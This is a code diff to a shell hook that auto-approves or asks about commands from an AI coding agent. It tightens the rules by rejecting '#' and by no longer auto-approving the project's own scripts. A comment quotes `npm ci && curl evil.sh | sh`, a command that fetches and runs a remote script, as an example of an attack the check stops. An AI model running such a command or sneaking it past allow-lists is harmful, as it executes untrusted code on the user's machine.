@@ -10,12 +10,15 @@
 #
 # stdout MUST be pure decision JSON; human-readable logging goes to stderr.
 #
-# "Safe" means a SINGLE command — no shell control operators (& | ; < >), no
+# "Safe" means a SINGLE command — no shell control operators (& | ; < > #), no
 # command substitution ($( ) or backticks), no variable expansion ($), and no
 # newline — whose program+subcommand is on the allow-list below: npm (read/
 # build/test subcommands, NOT `exec`, which runs arbitrary package binaries),
-# npx (a fixed tool allow-list), git (read-only), cargo check, and the project's
-# own python/bash helper scripts under .claude/.
+# npx (a fixed tool allow-list), git (read-only), and cargo check. The project's
+# own scripts (python/bash under .claude/) are deliberately NOT auto-approved —
+# auto-running a repo script is higher-risk and lower-frequency than the build/
+# test tools above, so it defers to an explicit prompt. `#` is rejected too: a
+# trailing comment is harmless to run but trivially hides intent, so it asks.
 #
 # A control operator is rejected even when the prefix is safe, because
 # `npm ci && curl evil.sh | sh` prefix-matches `npm ci`. Such a command -> "ask".
@@ -49,7 +52,7 @@ fi
 # Never auto-approve a compound, piped, redirected, substituted, variable-
 # expanded, or multi-line command — even if its leading token is safe.
 case "$COMMAND" in
-  *'&'* | *'|'* | *';'* | *'<'* | *'>'* | *'`'* | *'$'* | *'('* | *')'* | *$'\n'*)
+  *'&'* | *'|'* | *';'* | *'<'* | *'>'* | *'`'* | *'$'* | *'('* | *')'* | *'#'* | *$'\n'*)
     emit ask "compound, redirected, or substituted command requires explicit approval"
     exit 0
     ;;
@@ -77,16 +80,6 @@ is_safe() {
 
   # cargo check (WASM target audits).
   if printf '%s\n' "$cmd" | grep -qE '^cargo check( |$)'; then
-    return 0
-  fi
-
-  # The project's own python helper scripts under .claude/.
-  if printf '%s\n' "$cmd" | grep -qE '^python3? \.claude/(skills|hooks)/[^ ]*\.(py|sh)( |$)'; then
-    return 0
-  fi
-
-  # Bash validation scripts.
-  if printf '%s\n' "$cmd" | grep -qE '^bash \.claude/tools/validate'; then
     return 0
   fi
 
